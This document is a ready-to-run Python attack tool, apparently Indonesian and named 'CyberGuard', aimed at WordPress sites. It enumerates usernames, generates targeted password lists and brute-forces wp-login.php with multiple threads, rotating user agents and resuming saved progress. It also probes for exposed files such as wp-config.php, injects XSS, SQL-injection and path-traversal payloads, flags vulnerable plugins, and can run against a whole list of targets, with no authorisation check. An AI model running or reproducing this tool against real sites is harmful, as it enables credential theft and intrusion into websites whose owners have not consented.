import requests
import sys
import time
import os
import threading
from queue import Queue
from colorama import init, Fore, Style
from datetime import datetime
import re
import random
import string
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from bs4 import BeautifulSoup
from tqdm import tqdm
from ratelimit import limits, sleep_and_retry
import pickle

# Inisialisasi colorama
init()

# Banner pro gratis
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.RED}   _____       _     _ _______   _____  _____ 
{Fore.YELLOW}  /     \     (_)   | |  ___|  /     |/     |
{Fore.RED} |  /\/\ \     _ ___| | |_    |  | ||  | || 
{Fore.YELLOW}|  |    | |   | / __| |  _|   |  |_| |  |_| |
{Fore.RED} \  \    /    | \__ \ | |     \     |\     |
{Fore.YELLOW}  \_/    \_/  |_|___/_|_|      \_/  \_/   
{Fore.CYAN}==========================================================
{Fore.YELLOW}      CyberGuard v9.1 - Pro Gratis Edition
{Fore.CYAN}==========================================================
{Fore.GREEN} Created by: Ibar - The Pro Free Cyber Legend
{Fore.GREEN} Warning: Pro power, zero cost. Use responsibly!
{Fore.CYAN}=========================================================={Style.RESET_ALL}
    """
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.1)

# Modul 1: Cek WordPress
def check_wordpress(url):
    try:
        headers = {'User-Agent': random_user_agent()}
        response = requests.get(url, headers=headers, timeout=5)
        if 'wp-content' in response.text or 'wp-includes' in response.text:
            print(f"{Fore.GREEN}[+] Target is WordPress!{Style.RESET_ALL}")
            version = re.search(r'wp-embed\.min\.js\?ver=(\d+\.\d+\.\d+)', response.text)
            if version:
                print(f"{Fore.YELLOW}[+] Version detected: {version.group(1)}{Style.RESET_ALL}")
            waf_headers = response.headers
            if 'cloudflare' in str(waf_headers).lower() or 'sucuri' in str(waf_headers).lower():
                print(f"{Fore.RED}[!] WAF detected: Possible Cloudflare/Sucuri{Style.RESET_ALL}")
            return response.text
        else:
            print(f"{Fore.RED}[-] Not a WordPress site.{Style.RESET_ALL}")
            return None
    except requests.RequestException as e:
        print(f"{Fore.RED}[-] Connection error: {e}{Style.RESET_ALL}")
        return None

# Random User-Agent
def random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36'
    ]
    return random.choice(agents)

# Modul 2: Enumerasi username
def enumerate_usernames(url, report_file):
    print(f"{Fore.CYAN}[*] Pro username enumeration...{Style.RESET_ALL}")
    usernames = set()
    
    for user_id in range(1, 31):
        user_url = f"{url}/?author={user_id}"
        try:
            response = requests.get(user_url, headers={'User-Agent': random_user_agent()}, timeout=5)
            if response.status_code == 200 and 'author' in response.url:
                username = re.search(r'author/([^/]+)', response.url)
                if username:
                    usernames.add(username.group(1))
                    result = f"[+] User via author: {username.group(1)} (ID: {user_id})"
                    print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                    with open(report_file, 'a') as f:
                        f.write(result + '\n')
        except requests.RequestException:
            pass
    
    api_url = f"{url}/wp-json/wp/v2/users"
    try:
        response = requests.get(api_url, headers={'User-Agent': random_user_agent()}, timeout=5)
        if response.status_code == 200:
            users = response.json()
            for user in users:
                usernames.add(user['slug'])
                result = f"[+] User via REST API: {user['slug']}"
                print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                with open(report_file, 'a') as f:
                    f.write(result + '\n')
    except requests.RequestException:
        pass
    
    return list(usernames)

# Modul 3: Wordlist pintar
def generate_smart_wordlist(url, html_content, usernames, report_file, external_wordlist=None):
    print(f"{Fore.CYAN}[*] Generating pro smart wordlist...{Style.RESET_ALL}")
    wordlist = set()
    priority_words = []
    
    domain = re.sub(r'https?://|www\.|\.com|\.org|\.id', '', url).strip('/')
    base_words = [domain, domain.replace('-', ''), "admin", "password", "123456", "login", "wordpress"]
    base_words.extend(usernames)
    base_words = list(set(base_words))
    
    years = [str(i) for i in range(2015, 2026)]  # Fokus ke tahun baru
    symbols = ['!', '@', '#', '$', '%']
    
    # Prioritaskan username + tahun
    for user in usernames:
        for year in years:
            priority_words.append(user + year)
            priority_words.append(year + user)
        priority_words.append(user)
        priority_words.append(user.lower())
        priority_words.append(user.capitalize())
    
    wordlist.update(priority_words)
    wordlist.update(base_words)
    
    for word in base_words:
        wordlist.add(word.lower())
        for symbol in symbols:
            wordlist.add(word + symbol)
    
    if html_content:
        soup = BeautifulSoup(html_content, 'html.parser')
        meta_tags = soup.find_all('meta')
        for tag in meta_tags:
            if tag.get('content'):
                base_words.extend(re.findall(r'\w+', tag.get('content')))
        title = soup.title.string if soup.title else ""
        base_words.extend(re.findall(r'\w+', title))
    
    if external_wordlist and os.path.exists(external_wordlist):
        with open(external_wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                wordlist.add(line.strip())
    
    wordlist = list(wordlist)[:2000]  # Batasi 2000 kata
    print(f"{Fore.GREEN}[+] Generated {len(wordlist)} smart passwords!{Style.RESET_ALL}")
    with open(report_file, 'a') as f:
        f.write(f"\nSmart Wordlist Sample (Top 10):\n{chr(10).join(wordlist[:10])}\n")
    return wordlist

# Modul 4: Fuzzing pintar otomatis
def generate_smart_fuzz_payloads(report_file):
    print(f"{Fore.CYAN}[*] Generating pro smart fuzz payloads...{Style.RESET_ALL}")
    payloads = set()
    
    # Prioritaskan payload high-impact
    priority_payloads = [
        "' OR 1=1 --", "1' OR '1'='1", "<script>alert('xss')</script>",
        "'><img src=x onerror=alert('xss')>", "../../etc/passwd"
    ]
    payloads.update(priority_payloads)
    
    # Variasi sederhana
    for base in priority_payloads:
        payloads.add(base + ";")
        payloads.add(base + "%00")
    
    payloads = list(payloads)[:500]  # Batasi 500 payload
    print(f"{Fore.GREEN}[+] Generated {len(payloads)} smart fuzz payloads!{Style.RESET_ALL}")
    with open(report_file, 'a') as f:
        f.write(f"\nSmart Fuzz Payloads Sample (Top 10):\n{chr(10).join(payloads[:10])}\n")
    return payloads

# Modul 5: CSRF Token Handling
def get_csrf_token(url, session):
    try:
        response = session.get(url, headers={'User-Agent': random_user_agent()}, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'wp_nonce'})
        if token:
            print(f"{Fore.GREEN}[+] CSRF token found: {token['value']}{Style.RESET_ALL}")
            return token['value']
        else:
            print(f"{Fore.YELLOW}[-] No CSRF token found{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[-] Error fetching CSRF token: {e}{Style.RESET_ALL}")
        return None

# Modul 6: Brute-force
@sleep_and_retry
@limits(calls=5, period=1)  # 5 req/s
def brute_force_worker(url, username, password_queue, found_flag, report_file, progress_file, max_attempts=1000):
    login_url = f"{url}/wp-login.php"
    session = requests.Session()
    attempt_count = 0
    tried_passwords = set()
    
    # Load progress
    if os.path.exists(progress_file):
        with open(progress_file, 'rb') as f:
            tried_passwords = pickle.load(f)
    
    # Ekstrak CSRF token
    csrf_token = get_csrf_token(login_url, session)
    
    while not password_queue.empty() and not found_flag.is_set() and attempt_count < max_attempts:
        password = password_queue.get()
        if password in tried_passwords:
            password_queue.task_done()
            continue
        
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{url}/wp-admin/",
            'testcookie': '1'
        }
        if csrf_token:
            payload['wp_nonce'] = csrf_token
        
        headers = {'User-Agent': random_user_agent()}
        
        try:
            response = session.post(login_url, data=payload, headers=headers, timeout=5)
            if 'recaptcha' in response.text.lower() or 'hcaptcha' in response.text.lower():
                print(f"{Fore.RED}[-] CAPTCHA detected for {username}:{password}, skipping...{Style.RESET_ALL}")
                with open(report_file, 'a') as f:
                    f.write(f"[-] CAPTCHA detected, stopping brute force for {username}\n")
                break
            if 'wp-admin' in response.url or 'dashboard' in response.text:
                result = f"[+] LOGIN SUCCESS: {username}:{password}"
                print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                with open(report_file, 'a') as f:
                    f.write(result + '\n')
                found_flag.set()
            elif response.status_code == 429:
                print(f"{Fore.RED}[-] Rate limit (429), pausing...{Style.RESET_ALL}")
                time.sleep(10)
                password_queue.put(password)
            elif response.status_code in [502, 503]:
                print(f"{Fore.RED}[-] Server error ({response.status_code}), pausing...{Style.RESET_ALL}")
                time.sleep(15)
                password_queue.put(password)
            else:
                print(f"{Fore.YELLOW}[-] Failed: {username}:{password}{Style.RESET_ALL}")
            tried_passwords.add(password)
            attempt_count += 1
            time.sleep(random.uniform(0.5, 1.5))
            
            # Simpan progress
            if attempt_count % 100 == 0:
                with open(progress_file, 'wb') as f:
                    pickle.dump(tried_passwords, f)
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Connection error on {password}: {e}{Style.RESET_ALL}")
            time.sleep(10)
            password_queue.put(password)
        password_queue.task_done()

def brute_force_login(url, usernames, passwords, report_file):
    print(f"{Fore.CYAN}[*] Pro brute-force attack...{Style.RESET_ALL}")
    for username in tqdm(usernames, desc="Brute-forcing usernames"):
        password_queue = Queue()
        found_flag = threading.Event()
        progress_file = f"progress_{username}.pkl"
        
        for pwd in passwords[:1000]:  # Batasi 1000 password
            password_queue.put(pwd)
        
        threads = []
        for _ in range(5):  # 5 thread
            t = threading.Thread(target=brute_force_worker, args=(url, username, password_queue, found_flag, report_file, progress_file))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        if found_flag.is_set():
            break

# Modul 7: Cek file sensitif
def check_sensitive_files(url, report_file):
    sensitive_files = ['wp-config.php', 'xmlrpc.php', '.htaccess', 'wp-config-sample.php', 'readme.html', 'license.txt', 'wp-login.php.bak']
    print(f"{Fore.CYAN}[*] Scanning sensitive files...{Style.RESET_ALL}")
    
    for file in tqdm(sensitive_files, desc="Scanning files"):
        file_url = f"{url}/{file}"
        try:
            response = requests.get(file_url, headers={'User-Agent': random_user_agent()}, timeout=5)
            if response.status_code == 200:
                result = f"[!] Exposed file: {file_url}"
                print(f"{Fore.RED}{result}{Style.RESET_ALL}")
                with open(report_file, 'a') as f:
                    f.write(result + '\n')
            elif response.status_code in [502, 503]:
                print(f"{Fore.RED}[-] Server error ({response.status_code}), pausing...{Style.RESET_ALL}")
                time.sleep(10)
            else:
                print(f"{Fore.GREEN}[+] {file} not exposed{Style.RESET_ALL}")
            time.sleep(random.uniform(0.3, 0.7))
        except requests.RequestException:
            print(f"{Fore.YELLOW}[-] Could not check {file}{Style.RESET_ALL}")

# Modul 8: Tes XSS
def test_xss(url, report_file):
    print(f"{Fore.CYAN}[*] Testing pro XSS vulnerabilities...{Style.RESET_ALL}")
    payloads = [
        "<script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "';alert('XSS');//",
        "<input type='text' value='' onfocus=alert('XSS')>"
    ]
    test_urls = [f"{url}/?s=", f"{url}/?p=1&comment=", f"{url}/?author=1&test="]
    
    for test_url in tqdm(test_urls, desc="Testing XSS"):
        for payload in payloads:
            try:
                response = requests.get(test_url + payload, headers={'User-Agent': random_user_agent()}, timeout=5)
                if payload in response.text:
                    result = f"[!] XSS Vulnerable: {test_url}{payload}"
                    print(f"{Fore.RED}{result}{Style.RESET_ALL}")
                    with open(report_file, 'a') as f:
                        f.write(result + '\n')
                else:
                    print(f"{Fore.YELLOW}[-] No XSS with {payload}{Style.RESET_ALL}")
                time.sleep(random.uniform(0.3, 0.7))
            except requests.RequestException:
                print(f"{Fore.RED}[-] Error testing {payload}{Style.RESET_ALL}")

# Modul 9: WPScan API
def check_wpscan_vulns(url, api_token, report_file):
    print(f"{Fore.CYAN}[*] Checking WPScan API...{Style.RESET_ALL}")
    headers = {'Authorization': f'Token token={api_token}'}
    api_url = f"https://wpscan.com/api/v3/wordpresses?url={url}"
    try:
        response = requests.get(api_url, headers=headers, timeout=10)
        if response.status_code == 200:
            vulns = response.json()
            if vulns.get('vulnerabilities'):
                for vuln in vulns['vulnerabilities']:
                    result = f"[!] WPScan Vuln: {vuln['title']} (CVE: {vuln.get('cve', 'N/A')})"
                    print(f"{Fore.RED}{result}{Style.RESET_ALL}")
                    with open(report_file, 'a') as f:
                        f.write(result + '\n')
            else:
                print(f"{Fore.GREEN}[+] No known vulnerabilities found via WPScan{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] WPScan API error: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] WPScan API error: {e}{Style.RESET_ALL}")

# Modul 10: Database vuln lokal
def load_local_vuln_db(report_file):
    vuln_db = {
        'revslider': {'version': '<=3.0.95', 'cve': 'CVE-2014-9735', 'desc': 'Remote Code Execution'},
        'wp-file-manager': {'version': '<=6.8', 'cve': 'CVE-2020-25213', 'desc': 'Arbitrary File Upload'}
    }
    print(f"{Fore.CYAN}[*] Loaded local vulnerability database{Style.RESET_ALL}")
    with open(report_file, 'a') as f:
        f.write(f"\nLocal Vulnerability Database Loaded: {len(vuln_db)} entries\n")
    return vuln_db

def check_vulnerable_plugins(url, vuln_db, report_file):
    print(f"{Fore.CYAN}[*] Checking vulnerable plugins...{Style.RESET_ALL}")
    for plugin in tqdm(vuln_db.keys(), desc="Checking plugins"):
        plugin_url = f"{url}/wp-content/plugins/{plugin}/"
        try:
            response = requests.get(plugin_url, headers={'User-Agent': random_user_agent()}, timeout=5)
            if response.status_code != 404:
                result = f"[!] Vulnerable plugin detected: {plugin} ({vuln_db[plugin]['cve']} - {vuln_db[plugin]['desc']})"
                print(f"{Fore.RED}{result}{Style.RESET_ALL}")
                with open(report_file, 'a') as f:
                    f.write(result + '\n')
            else:
                print(f"{Fore.GREEN}[+] {plugin} not found{Style.RESET_ALL}")
            time.sleep(random.uniform(0.3, 0.7))
        except requests.RequestException:
            print(f"{Fore.YELLOW}[-] Could not check {plugin}{Style.RESET_ALL}")

# Modul 11: Fuzzing pro
def fuzz_parameters(url, report_file, fuzz_file=None):
    print(f"{Fore.CYAN}[*] Pro fuzzing for zero-day bugs...{Style.RESET_ALL}")
    params = ['id', 'p', 's', 'page_id', 'cat', 'post', 'search']
    payloads = generate_smart_fuzz_payloads(report_file)
    
    if fuzz_file and os.path.exists(fuzz_file):
        with open(fuzz_file, 'r', encoding='utf-8', errors='ignore') as f:
            payloads.extend([line.strip() for line in f if line.strip()])
    
    for param in tqdm(params, desc="Fuzzing parameters"):
        for payload in payloads[:500]:
            fuzz_url = f"{url}/?{param}={payload}"
            try:
                response = requests.get(fuzz_url, headers={'User-Agent': random_user_agent()}, timeout=5)
                if any(x in response.text.lower() for x in ['mysql', 'sql', 'error', payload]):
                    result = f"[!] Potential zero-day bug: {fuzz_url} (Response anomaly)"
                    print(f"{Fore.RED}{result}{Style.RESET_ALL}")
                    with open(report_file, 'a') as f:
                        f.write(result + '\n')
                else:
                    print(f"{Fore.YELLOW}[-] No anomaly with {param}={payload}{Style.RESET_ALL}")
                time.sleep(random.uniform(0.3, 0.7))
            except requests.RequestException:
                print(f"{Fore.RED}[-] Error fuzzing {param}{Style.RESET_ALL}")

# Modul 12: Multi-target
def load_targets(target_file):
    if os.path.exists(target_file):
        with open(target_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return None

# Modul 13: Logging
def log_action(action, log_file="cyberguard.log"):
    with open(log_file, 'a') as f:
        f.write(f"[{datetime.now()}] {action}\n")

# Modul 14: Laporan PDF
def generate_pdf_report(report_file, pdf_file):
    c = canvas.Canvas(pdf_file, pagesizes=letter)
    c.setFont("Helvetica", 12)
    c.drawString(100, 750, "CyberGuard v9.1 - Pro Gratis Report")
    c.drawString(100, 730, f"Generated: {datetime.now()}")
    
    y = 700
    with open(report_file, 'r') as f:
        for line in f:
            if y < 50:
                c.showPage()
                y = 750
            c.drawString(50, y, line.strip())
            y -= 15
    
    c.save()
    print(f"{Fore.GREEN}[+] PDF report generated: {pdf_file}{Style.RESET_ALL}")

# Fungsi utama
def main():
    print_banner()
    
    if len(sys.argv) < 2:
        print(f"{Fore.RED}Usage: python cyberguard.py <target_url/targets.txt> [external_wordlist] [fuzz_file] [wpscan_api_token]{Style.RESET_ALL}")
        sys.exit(1)
    
    target_input = sys.argv[1]
    external_wordlist = sys.argv[2] if len(sys.argv) > 2 else None
    fuzz_file = sys.argv[3] if len(sys.argv) > 3 else None
    wpscan_api_token = sys.argv[4] if len(sys.argv) > 4 else None
    
    targets = load_targets(target_input) if target_input.endswith('.txt') else [target_input]
    if not targets:
        print(f"{Fore.RED}[-] No valid targets provided{Style.RESET_ALL}")
        sys.exit(1)
    
    report_file = f"cyberguard_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    pdf_file = report_file.replace('.txt', '.pdf')
    with open(report_file, 'w') as f:
        f.write(f"CyberGuard v9.1 Pro Gratis Report\nTargets: {', '.join(targets)}\nDate: {datetime.now()}\n\n")
    
    vuln_db = load_local_vuln_db(report_file)
    
    for target_url in targets:
        if not target_url.startswith('http'):
            target_url = f"http://{target_url}"
        
        log_action(f"Starting scan on {target_url}")
        html_content = check_wordpress(target_url)
        if not html_content:
            continue
        
        usernames = enumerate_usernames(target_url, report_file)
        if not usernames:
            usernames = ["admin"]
            print(f"{Fore.YELLOW}[!] No users found, using default 'admin'{Style.RESET_ALL}")
        
        passwords = generate_smart_wordlist(target_url, html_content, usernames, report_file, external_wordlist)
        brute_force_login(target_url, usernames, passwords, report_file)
        check_sensitive_files(target_url, report_file)
        test_xss(target_url, report_file)
        if wpscan_api_token:
            check_wpscan_vulns(target_url, wpscan_api_token, report_file)
        check_vulnerable_plugins(target_url, vuln_db, report_file)
        fuzz_parameters(target_url, report_file, fuzz_file)
    
    generate_pdf_report(report_file, pdf_file)
    log_action("Scan completed")
    print(f"{Fore.CYAN}[*] Pro gratis scan completed! Check {report_file} and {pdf_file}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()